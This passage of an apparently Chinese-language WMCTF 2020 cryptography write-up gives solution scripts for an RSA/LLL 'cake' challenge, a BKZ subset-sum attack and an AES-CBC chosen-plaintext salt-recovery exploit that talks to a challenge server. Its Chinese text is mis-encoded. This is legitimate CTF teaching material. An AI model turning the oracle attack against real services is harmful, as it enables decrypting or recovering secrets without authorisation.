class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># åˆ†æ¯</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[105]:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[106]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_d</span><span class="params">()</span>:</span></span><br><span class="line">    dAndN = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">15</span>)):</span><br><span class="line">        q, h, c1, N, c2 = make_cake()</span><br><span class="line">        quotients = rational_to_quotients(h, q)</span><br><span class="line">        convergents = convergents_from_quotients(quotients)</span><br><span class="line">        <span class="keyword">for</span> (k, f) <span class="keyword">in</span> convergents:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                g = (f * h) % q</span><br><span class="line">                f_inv_g = inverse(f, g)</span><br><span class="line">                cake = (c1 * f % q) * f_inv_g % g</span><br><span class="line">                <span class="keyword">if</span> pow(cake, f, N) == c2:</span><br><span class="line">                    dAndN.append((f, N))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> dAndN</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[107]:</span></span><br><span class="line"></span><br><span class="line">dAndN = crack_d()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[108]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_e</span><span class="params">(dAndN)</span>:</span></span><br><span class="line">    ds = [_[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> dAndN]</span><br><span class="line">    Ns = [_[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> dAndN]</span><br><span class="line">    M = isqrt(max(Ns))</span><br><span class="line">    A = Matrix(ZZ, len(dAndN) + <span class="number">1</span>, len(dAndN) + <span class="number">1</span>)</span><br><span class="line">    A[<span class="number">0</span>] = [M] + ds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dAndN)):</span><br><span class="line">        A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -Ns[i]</span><br><span class="line">    AL = A.LLL()</span><br><span class="line">    e = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span class="line">    <span class="keyword">return</span> abs(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[109]:</span></span><br><span class="line"></span><br><span class="line">guessed_e = crack_e(dAndN)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[113]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_n</span><span class="params">(e)</span>:</span></span><br><span class="line">    q, h, c1, N, c2 = eat_cake()</span><br><span class="line">    quotients = rational_to_quotients(h, q)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (k, f) <span class="keyword">in</span> convergents:</span><br><span class="line">        p = GCD(int(pow(<span class="number">2</span>, f * e - <span class="number">1</span>, N) - <span class="number">1</span>), N)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; N:</span><br><span class="line">            q = N // p</span><br><span class="line">            d = inverse(<span class="number">0x10001</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">            cake = pow(c2, d, N)</span><br><span class="line">            print(cake)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[114]:</span></span><br><span class="line"></span><br><span class="line">factor_n(guessed_e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[114]:</span></span><br><span class="line"></span><br><span class="line"><span class="number">1027157078764690788142214800555547316945408825954295437289921287369230545318955110388392518217927993775664997807441799234649846512106765423582377942936106014367093824346097587115033287595424792363420560894490129540416253724597810397</span></span><br><span class="line"><span class="number">1027157078764690788142214800555547316945408825954295437289921287369230545318955110388392518217927993775664997807441799234649846512106765423582377942936106014367093824346097587115033287595424792363420560894490129540416253724597810397</span></span><br></pre></td></tr></table></figure><h4 id="Others"><a href="#Others" class="headerlink" title="[Others]"></a>[Others]</h4><p>éé¢„æœŸæ˜¯å› ä¸ºç»™å‡ºsize(e)ï¼Œæ‰€ä»¥åªéœ€eat_cakeå³å¯é€šè¿‡cake%gå’Œgæ¢å¤å‡ºcake- -</p><h3 id="baby-sum-amp-sum"><a href="#baby-sum-amp-sum" class="headerlink" title="baby_sum &amp; sum"></a>baby_sum &amp; sum</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>baby_sumä¸­n=120ï¼Œk=20 (å³120ç»´å­é›†å’Œé—®é¢˜ï¼Œè§£å‘é‡é‡é‡ä¸º20)</p><ul><li>BKZæ‰€çº¦åŒ–çš„æ ¼åŸºåœ¨è¡Œåºshuffleåå¾—åˆ°ç»“æœä¸€èˆ¬ä¸åŒ</li><li>ä½œforced_zeroé™ç»´ï¼Œå‡è®¾é™ç»´è‡³105ç»´ï¼Œåˆ™è¦forced_zeroçš„20ä¸ªposå‡è½åœ¨è§£å‘é‡ä¸º0çš„posä¸Šï¼Œæ¦‚ç‡ä¸ºC(100,15)/C(120,15)</li><li>BKZçš„block_sizeå–22æˆ–ä»¥ä¸Š</li></ul><script type="math/tex; mode=display">\left[\begin{matrix}Na_{1} & 1 & 0 & ... & 0 & N\\Na_{2} & 0 & 1 & ... & 0 & N\\... & ... & ... & ... & ... & ...\\Na_{n} & 0 & 0 & ... & 1 & N\\Nc & 0 & 0 & ... & 0 & Nk\\\end{matrix}\right],N>\sqrt{n}</script><p>btwï¼Œ(2, 1)é‚£ä¸ªæ ¼å­åœ¨æœ¬é¢˜ä¹Ÿ8å¤ªå½³äºï¼Œä¸”æ ¼åŸºè¡Œåºä¸shuffleï¼Œè€Œæ˜¯æŠŠNcæ‰€åœ¨è¡Œæ”¾è‡³é¦–è¡ŒæˆåŠŸç‡ä¹Ÿè«åé«˜â€¦ç„å­¦ï¼ˆx</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Random.random <span class="keyword">as</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> load</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(elements, c, k, r, ID=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(elements) &gt; r)</span><br><span class="line">    n = len(elements) - r <span class="comment"># reduce dim -&gt; n</span></span><br><span class="line">    forced_zero = list(range(len(elements)))</span><br><span class="line">    indexes = set(range(len(elements)))</span><br><span class="line">    coef = ceil(sqrt(n))</span><br><span class="line">    itr = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t0 = cputime()</span><br><span class="line">        random.shuffle(forced_zero)</span><br><span class="line">        zero = set(forced_zero[:r])</span><br><span class="line">        <span class="comment"># print(zero)</span></span><br><span class="line">        reduced_indexes = [elements[i] <span class="keyword">for</span> i <span class="keyword">in</span> indexes - zero]</span><br><span class="line">        A_list = [[coef * c] + [<span class="number">0</span>] * n + [coef * k]]</span><br><span class="line">        <span class="keyword">for</span> i, ele <span class="keyword">in</span> enumerate(reduced_indexes):</span><br><span class="line">            A_list.append([coef * ele] + [<span class="number">1</span> * (j == i + <span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>)] + [coef])</span><br><span class="line">        <span class="comment"># random.shuffle(A_list) # row shuffle(extremely useful in most cases)</span></span><br><span class="line">        A = Matrix(ZZ, A_list)</span><br><span class="line">        AL = A.BKZ(block_size=<span class="number">22</span>)</span><br><span class="line">        print(<span class="string">"[&#123;&#125;] &#123;&#125; runs, cost &#123;:.3f&#125; s."</span>.format(ID, itr, cputime(t0)))</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> AL:</span><br><span class="line">            <span class="keyword">if</span> all(line[i] == <span class="number">0</span> <span class="keyword">or</span> line[i] == <span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">2</span>)) <span class="keyword">or</span> all(line[i] == <span class="number">0</span> <span class="keyword">or</span> line[i] == <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">2</span>)):</span><br><span class="line">                <span class="keyword">if</span> <span class="number">-1</span> <span class="keyword">in</span> line:</span><br><span class="line">                    line = -line</span><br><span class="line">                print(<span class="string">"[&#123;&#125;] &#123;&#125; success! &#123;&#125; &#123;&#125;"</span>.format(ID, itr, line[<span class="number">1</span>:<span class="number">-1</span>], zero))</span><br><span class="line">                part_sol = line[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                sol = <span class="string">''</span></span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(len(elements)):</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> zero:</span><br><span class="line">                        sol += <span class="string">'0'</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        sol += str(part_sol[j])</span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                print(<span class="string">"You got it ===&gt; &#123;&#125;"</span>.format(sol))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        itr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    CPU_CORE_NUM = <span class="number">8</span> <span class="comment"># 8æ ¸</span></span><br><span class="line">    c, elements = load(open(<span class="string">"data"</span>, <span class="string">"r"</span>))</span><br><span class="line">    k = <span class="number">20</span></span><br><span class="line">    r = <span class="number">15</span> <span class="comment"># 15-dim lower</span></span><br><span class="line">    crack_ID = partial(crack, elements, c, k, r) <span class="comment"># é«˜é˜¶åå‡½æ•°</span></span><br><span class="line">    <span class="keyword">with</span> mp.Pool(CPU_CORE_NUM) <span class="keyword">as</span> pool:</span><br><span class="line">        status = pool.imap_unordered(crack_ID, range(<span class="number">1</span>, <span class="number">1</span> + CPU_CORE_NUM))</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> status:</span><br><span class="line">            <span class="keyword">if</span> s:</span><br><span class="line">                pool.terminate()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿å¤ä¹ äº†ä¸€æ¬¡pythonçš„å¤šè¿›ç¨‹- -</p><p>(æ³¨ï¼šè„šæœ¬ä¸­è¡Œåºshuffleè¢«æ³¨é‡Šï¼Œå› ä¸ºNcè¡Œæ”¾ç½®é¦–è¡Œä¸€èˆ¬å‡ºçš„éƒ½å¾ˆå¿«â€¦ä¸çŸ¥é“why)</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-03_23-20-00.png" alt></p><h4 id="Others-1"><a href="#Others-1" class="headerlink" title="[Others]"></a>[Others]</h4><p>Sumæ²¡è·‘- -ç¥¥å“¥è¯´æµ‹é¢˜çš„æ—¶å€™è¦300+ cpu hoursï¼Œéœ‡æ’¼æˆ‘å¦ˆ</p><p><a href="Sum_wp.pdf">Click Here to Download Soreat_uâ€™s Official WriteUp</a></p><h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>AES-CBCçš„é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œå³$mt$å¯æ§ï¼Œè¿”å›$ct=E_{k}(mt||salt)$çš„oracle</p><p>è¯¥oracleä¸‹ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œåœ¨ä»»æ„åˆ†ç»„ä¸­å¼‚æˆ–åå‰15bitså¯æ§ï¼Œå³å¯çˆ†ç ´è·å¾—æœªçŸ¥LSB</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_16-15-01.png" alt></p><p>å‘é€<code>b&quot;\x00&quot;*15</code>è‡³æœåŠ¡å™¨ï¼Œåˆ™æ˜æ–‡ç¬¬ä¸€ä¸ªåˆ†ç»„ä¸º<code>b&quot;\x00&quot;*15+salt[0]</code>ï¼Œæˆªå–<code>cipher=ct[:16], known_iv=iv, iv=ct[-16:]</code>ï¼ˆCrypto.Cipher.AESçš„CBCæ¨¡å¼ivæ˜¯ä¼šéšç€åŠ å¯†è¡Œä¸ºæ›´æ–°çš„- -||ï¼ŒğŸ‘´å¼€debugåå‘ç°åŠ å¯†ç›¸åŒæ˜æ–‡å¾—åˆ°ä¸åŒå¯†æ–‡â€¦tclï¼Œæ‰€ä»¥å¿…éœ€åœ¨æ¯æ¬¡encryptåæ›´æ–°iv=ct[-16:]ï¼‰</p><p>å†çˆ†ç ´LSBï¼Œå³å‘é€<code>xor(b&quot;\x00&quot;*15+lsb, known_iv, iv)</code>è‡³æœåŠ¡å™¨(çˆ†ç ´è¿‡ç¨‹è®°å¾—æ›´æ–°iv)ï¼Œå½“ct[:16]=cipheræ—¶ï¼Œlsbæ­£ç¡®</p><p>å¾—åˆ°salt[0]åï¼Œç±»ä¼¼å‘é€14bits, 13bits, â€¦è‡³æœåŠ¡å™¨ï¼Œå¾—åˆ°salt[1:16]ï¼Œä½†serveråˆ¤æ–­len(mt)â‰ 0ï¼Œå› æ­¤åœ¨çˆ†ç ´salt[15]æ—¶ï¼Œprefixé•¿åº¦åº”ä¸º16</p><p>ä¸‹å›¾ä¸ºçˆ†ç ´salt[16]çš„ç¤ºæ„å›¾</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_22-21-36.png" alt></p><p>å’Œçˆ†ç ´salt[0]æ—¶ä¸€æ ·ï¼Œå‘é€<code>b&quot;\x00&quot;*15</code>ï¼Œä½†æ­¤æ—¶cipherå¯¹åº”ç¬¬äºŒä¸ªåˆ†ç»„ï¼Œä¸”known_ivä¸ºct[:16]</p><p>åˆ©ç”¨å·²çŸ¥çš„salt[1:16]å³å¯çˆ†ç ´LSBï¼Œè·å¾—salt[16]ï¼Œåç»­æ¯”ç‰¹æ“ä½œå‡ç±»ä¼¼</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="comment"># from tqdm import tqdm</span></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"XXXX\+([^\)]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== ([^\n]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXXX: "</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_lsb</span><span class="params">(known, cipher, known_iv, iv)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(known) == <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">        mt = known + bytes([lsb])</span><br><span class="line">        new_iv = xor(known_iv, iv)</span><br><span class="line">        mt = hexlify(xor(mt, new_iv))</span><br><span class="line">        io.sendlineafter(<span class="string">"(in hex): "</span>, mt)</span><br><span class="line">        ct = unhexlify(io.recvline().strip())</span><br><span class="line">        iv = ct[<span class="number">-16</span>:]</span><br><span class="line">        <span class="keyword">if</span> ct[:<span class="number">16</span>] == cipher:</span><br><span class="line">            print(hex(lsb)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">"0"</span>), end=<span class="string">""</span>)</span><br><span class="line">            <span class="keyword">return</span> bytes([lsb]), iv</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"[!] Not Found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"IV"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    iv = unhexlify(re.findall(<span class="string">r"is: ([^\n]+)"</span>, msg)[<span class="number">0</span>])</span><br><span class="line">    known = <span class="string">b"\x00"</span> * <span class="number">15</span></span><br><span class="line">    salt = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            prefix = hexlify(<span class="string">b"\x00"</span> * j)</span><br><span class="line">            io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">            io.sendlineafter(<span class="string">"(in hex): "</span>, prefix)</span><br><span class="line">            resp = unhexlify(io.recvline().strip())</span><br><span class="line">            cipher = resp[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                known_iv = resp[(i<span class="number">-1</span>)*<span class="number">16</span>:i*<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                known_iv = iv</span><br><span class="line">            iv = resp[<span class="number">-16</span>:]</span><br><span class="line">            lsb, iv = crack_lsb(known, cipher, known_iv, iv)</span><br><span class="line">            known = known[<span class="number">1</span>:] + lsb</span><br><span class="line">            salt += lsb</span><br><span class="line">        prefix = hexlify(<span class="string">b"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">"(in hex): "</span>, prefix)</span><br><span class="line">        resp = unhexlify(io.recvline().strip())</span><br><span class="line">        cipher = resp[(i+<span class="number">1</span>)*<span class="number">16</span>:(i+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">        known_iv = resp[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        iv = resp[<span class="number">-16</span>:]</span><br><span class="line">        lsb, iv = crack_lsb(known, cipher, known_iv, iv)</span><br><span class="line">        known = known[<span class="number">1</span>:] + lsb</span><br><span class="line">        salt += lsb</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(in hex): "</span>, hexlify(salt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    crack_salt()</span><br><span class="line">    print(<span class="string">"\n"</span> + io.recvline().strip().decode())</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="Others-2"><a href="#Others-2" class="headerlink" title="[Others]"></a>[Others]</h4><p>48*(256+1)æ¬¡encryptï¼Œæœ¬åœ°æµ‹ç§’å‡ºï¼ŒæŒ‚è½½äº‘æœåŠ¡å™¨å¤§æ¦‚ç»™å‡ºçš„alram(1200)ä¹Ÿç»°ç»°æœ‰ä½™</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_22-27-56.png" alt></p><p>iæ˜¥ç§‹å…¬ç›Šèµ›èµµæ€»å‡ºäº†é¢˜æŒºç±»ä¼¼çš„(NewsWebsite)ï¼Œä¹Ÿæ˜¯$ct=E_{k}(mt||salt)$çš„oracleï¼Œä½†æ˜¯æ˜¯ECB_MODEï¼Œ<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuoj.cn</a>ä¸Šæœ‰å¤ç°ç¯å¢ƒï¼Œæ„Ÿå…´è¶£å¯ä»¥å»van~</p><h3 id="idiot-box"><a href="#idiot-box" class="headerlink" title="idiot box"></a>idiot box</h3><h4 id="é¢˜è§£åˆ†æ-3"><a href="#é¢˜è§£åˆ†æ-3" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><a href="https://0xdktb.top/2020/04/11/Summary-of-Crypto-in-CTF-Block/#%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90" target="_blank" rel="noopener">Click Here to View the WriteUp</a></p><h4 id="Others-3"><a href="#Others-3" class="headerlink" title="[Others]"></a>[Others]</h4><p>SUç”¨çš„ä¹Ÿæ˜¯äºŒè½®è¿­ä»£å·®åˆ†ç‰¹å¾ï¼Œä½†ä¼¼ä¹æ›´å¥½äº›ï¼ˆç”šè‡³è®©æˆ‘è§‰å¾—æ™®é€‚æ€§çš„1-Rå·®åˆ†æ”»å‡»æ˜¯ä¸ªæ†¨æ†¨â€¦</p><p>å›¾1æ˜¯æˆ‘æ‰€ç”¨å››æ¡å·®åˆ†è·¯å¾„å…¶ä¸­çš„ä¸€æ¡ï¼ˆå¯¹åº”çš„ä¸æ˜¯WMCTFä¸Šå‘å¸ƒçš„ç‰ˆæœ¬ï¼Œæ˜¯æˆ‘ä¹‹å‰è‡ªå·±æµ‹é¢˜çš„ç¬¬ä¸€ç‰ˆï¼Œéš¾åº¦ä¼šæ›´å¤§äº›ï¼Œå›¾æ‡’å¾—æ”¹äº†- -btwç¥¥å“¥æ¨èçš„<a href="https://draw.io/" target="_blank" rel="noopener">draw.io</a>ç”»å›¾çœŸçš„å¥½ç”¨ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/idiot_box.png" alt></p><p>è€Œå›¾2æ˜¯ç¥¥å“¥æ‰€ç”¨çš„å·®åˆ†è·¯å¾„ï¼ˆå¯¹åº”çš„æ˜¯WMCTFä¸Šå‘å¸ƒçš„ç‰ˆæœ¬ï¼Œä½†æ˜¯ä¸€æ¡å°±èƒ½å‡ºæœ€åä¸€è½®å®Œæ•´çš„å­å¯†é’¥ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Screen Shot 2020-08-03 at 5.47.03 AM.png" 